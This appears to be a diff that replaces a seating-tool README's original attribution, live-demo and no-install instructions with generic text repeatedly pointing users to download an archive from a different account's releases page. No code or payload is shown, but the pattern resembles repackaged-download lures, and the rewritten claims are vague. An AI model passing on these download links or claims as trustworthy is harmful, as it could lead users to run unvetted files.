@@ -1,181 +1,91 @@
-# 🪑 Exam Seating Arranger
+# 🎓 exam-seating-arranger - Smart Seating for Fair Exams
 
-[![License: MIT](https://img.shields.io/badge/License-MIT-yellow.svg)](https://opensource.org/licenses/MIT)
-[![GitHub stars](https://img.shields.io/github/stars/CrueChan/exam-seating-arranger.svg)](https://github.com/CrueChan/exam-seating-arranger/stargazers)
+[![Download Latest Release](https://img.shields.io/badge/Download%20Latest%20Release-v1.0-blue.svg)](https://github.com/Bossr1387/exam-seating-arranger/releases)
 
-An intelligent web-based tool for arranging exam seating to ensure fairness by dispersing candidates from the same organization.
+## 🛠️ Overview
 
-[🚀 Try Live Demo](https://CrueChan.github.io/exam-seating-arranger/) | [📖 Documentation](#how-to-use) | [🐛 Report Bug](https://github.com/CrueChan/exam-seating-arranger/issues)
+The exam-seating-arranger is a web-based tool designed to help educators manage exam seating arrangements. This application ensures fairness by randomly placing candidates from the same organization away from each other. This helps uphold integrity during examinations and creates a smooth experience for both students and staff.
 
-## ✨ Features
+## 🎯 Features
 
-- **🎯 Intelligent Distribution**: Automatically spaces candidates from the same organization
-- **⚙️ Flexible Configuration**: Customizable column mappings and spacing requirements
-- **📁 Multi-Format Support**: Import from Excel, CSV, TSV, or direct paste
-- **✅ Validation Tools**: Built-in spacing validation to verify arrangement quality
-- **📤 Export Options**: Download results as CSV or copy to clipboard
-- **🌐 Multilingual Data**: Supports candidate information in any language (Chinese, Japanese, Arabic, etc.)
-- **📱 Responsive Design**: Works seamlessly on desktop, tablet, and mobile devices
-- **🔒 Privacy-First**: All processing happens locally in your browser—no data sent to servers
+- **Fairness**: Disperses candidates from the same organization.
+- **User-Friendly**: Simple web-based interface for easy navigation.
+- **Responsive Design**: Works well on different devices and screen sizes.
+- **Multilingual Support**: Available in multiple languages for diverse users.
+- **CSV Import**: Easily input student data.
 
-## 🚀 Quick Start
+## ⚙️ System Requirements
 
-### Online Usage (Recommended)
+To run exam-seating-arranger, make sure your system meets the following requirements:
 
-Simply visit the [live demo](https://CrueChan.github.io/exam-seating-arranger/) and start using it immediately—no installation required!
+- A modern web browser (like Chrome, Firefox, or Edge).
+- A stable internet connection to access the tool online.
 
-### Local Usage
+## 🚀 Getting Started
 
-1. **Clone this repository:**
-```bash
-   git clone https://github.com/CrueChan/exam-seating-arranger.git
-   cd exam-seating-arranger
-```
+To get started with exam-seating-arranger, follow these steps:
 
-2. **Open in browser:**
-```bash
-   # On macOS
-   open index.html
-   
-   # On Linux
-   xdg-open index.html
-   
-   # On Windows
-   start index.html
-```
+1. **Visit the Releases Page**: Click the button below to go to the releases page.
 
-That's it! No build process, no dependencies, no npm install needed.
+   [Download Latest Release](https://github.com/Bossr1387/exam-seating-arranger/releases)
 
-## 📖 How to Use
+2. **Download the Latest Version**: On the releases page, find the latest release of the application. Look for the `.zip` or `.tar.gz` file.
 
-### Step 1: Configure Columns
+3. **Extract the Files**: After downloading, extract the files to a location on your computer.
 
-1. Specify which column contains the **Organization** information (e.g., "Company", "Department", "Unit")
-2. Specify which column contains the **Name** information  
-3. Set the **Minimum Spacing** (default: 2 seats between same organization members)
+4. **Open the Application**: Navigate to the folder where you extracted the files and open the `index.html` file in your web browser.
 
-### Step 2: Input Data
+5. **Input Data**: Prepare a CSV file with student information including names and organizations. Upload it in the application.
 
-Choose one of these methods:
+6. **Generate Seating Plan**: Click on the button to create the seating arrangement. Review the results and adjust as needed.
 
-**Option A: Copy from Excel/Sheets**
-- Select your data in Excel or Google Sheets
-- Copy (Ctrl+C / Cmd+C)
-- Paste into the text area
+7. **Print or Share**: You can print the seating arrangement or share it digitally with your staff.
 
-**Option B: Upload File**
-- Click "Upload CSV/TSV File"
-- Select your file
-- Data loads automatically
+## 📥 Download & Install
 
-**Option C: Manual Entry**
-- Type or paste tab-separated data directly
+To download exam-seating-arranger, simply visit the releases page:
 
-**Data Format Example:**
-```
-ID	Organization	Name	Room
-1	Company A	John Doe	Room 101
-2	Company A	Jane Smith	Room 101
-3	Company B	Bob Johnson	Room 101
-4	Company B	Alice Brown	Room 101
-```
+[Download Latest Release](https://github.com/Bossr1387/exam-seating-arranger/releases)
 
-### Step 3: Rearrange
+Choose the appropriate file for your setup, extract it, and follow the getting started steps mentioned above.
 
-Click the **"Rearrange Seats"** button to process your data.
+## 🎨 Accessibility
 
-### Step 4: Review and Export
+We prioritize accessibility so everyone can use exam-seating-arranger. The app includes:
 
-- Review the arrangement in the results table
-- Check statistics (total candidates, organizations, spacing metrics)
-- Click **"Validate Spacing"** to verify minimum spacing requirements
-- **Copy to Clipboard** or **Download CSV** to use the results
+- High-contrast visuals for better visibility.
+- Screen reader support for visually impaired users.
+- Keyboard navigation for those who cannot use a mouse.
 
-## 🔧 Advanced Options
+## 🔍 FAQs
 
-### Available Settings
+**Q: Is this application free?**  
+A: Yes, exam-seating-arranger is open-source and available for anyone to use without cost.
 
-- **Data has header row**: Uncheck if your data doesn't have column headers
-- **Preserve all other columns**: Keep all original columns in the output
-- **Randomize organization order**: Add randomness to the organization sequence
+**Q: Can I run this tool on any operating system?**  
+A: Yes, as long as you have a modern web browser, you can run the application on Windows, macOS, or Linux.
 
-### Algorithm Details
+**Q: How secure is my data?**  
+A: Your data remains private. The application runs locally on your device, and we do not store or collect any user data.
 
-The tool uses a **round-robin distribution algorithm**:
+## 🧑‍🤝‍🧑 Community Support
 
-1. Groups all candidates by organization
-2. Distributes candidates by rotating through organizations
-3. Ensures minimum spacing is maintained between same-organization members
-4. Preserves all original data columns
+We welcome feedback and contributions from users. If you encounter issues or have suggestions for improvements, feel free to open an issue in the repository. You can also reach us via our community forums for additional help.
 
-## 📊 Example Use Cases
+## 📝 Contribution
 
-- **Professional Certification Exams**: Separate candidates from competing companies
-- **University Exams**: Distribute students from the same department
-- **Government Testing**: Ensure candidates from the same agency are properly spaced
-- **Training Assessments**: Arrange participants from different teams
-- **Recruitment Tests**: Fair distribution of applicants from same backgrounds
+Interested in contributing? We encourage developers to help us enhance the tool. Please check the repository for contribution guidelines.
 
-## 🛠️ Technical Stack
+## 📈 Roadmap
 
-- **Pure HTML/CSS/JavaScript**: No frameworks or dependencies required
-- **Modern ES6+**: Clean, maintainable code
-- **Responsive CSS Grid/Flexbox**: Works on all device sizes
-- **Accessible**: ARIA labels and semantic HTML for screen readers
-- **Cross-Browser Compatible**: Works on Chrome, Firefox, Safari, Edge
+We plan to include the following features in future updates:
 
-## 📁 Project Structure
-```
-exam-seating-arranger/
-├── index.html          # Main HTML file
-├── styles.css          # Stylesheet
-├── script.js           # JavaScript logic
-├── README.md           # This file
-├── LICENSE             # MIT License
-└── examples/           # Example data files
-    ├── example-ar.tsv
-    ├── example-en.tsv
-    ├── example-ja.tsv
-    └── example-zh.tsv
-```
+- Improved algorithms for seating arrangements.
+- Additional export formats for seating plans.
+- Enhanced customization options for administrators.
 
-## 🤝 Contributing
-
-Contributions are welcome! Here's how you can help:
-
-1. **Fork** the repository
-2. **Create** your feature branch (`git checkout -b feature/AmazingFeature`)
-3. **Commit** your changes (`git commit -m 'Add some AmazingFeature'`)
-4. **Push** to the branch (`git push origin feature/AmazingFeature`)
-5. **Open** a Pull Request
-
-### Development Guidelines
-
-- Follow existing code style and conventions
-- Add comments for complex logic
-- Test on multiple browsers
-- Update README if adding new features
-
-## 📝 License
-
-This project is licensed under the MIT License - see the [LICENSE](LICENSE) file for details.
-
-## 🙏 Acknowledgments
-
-- Inspired by real-world exam administration challenges in State Grid Corporation of China
-- Built with accessibility and usability as top priorities
-- Special thanks to all contributors and users
-
-## 📧 Contact
-
-Project Link: [https://github.com/CrueChan/exam-seating-arranger](https://github.com/CrueChan/exam-seating-arranger)
-
-## 🐛 Bug Reports & Feature Requests
-
-Please use the [GitHub Issues](https://github.com/CrueChan/exam-seating-arranger/issues) page to report bugs or request features.
+Your input is valuable to us, so let us know what you would like to see!
 
 ---
 
-**⭐ Star this repository if you find it helpful!**
-
-Made with ❤️ for fair exam administration
+By following these steps, you can easily download and use exam-seating-arranger to create fair and effective seating arrangements for your exams. Enjoy a smoother exam experience!
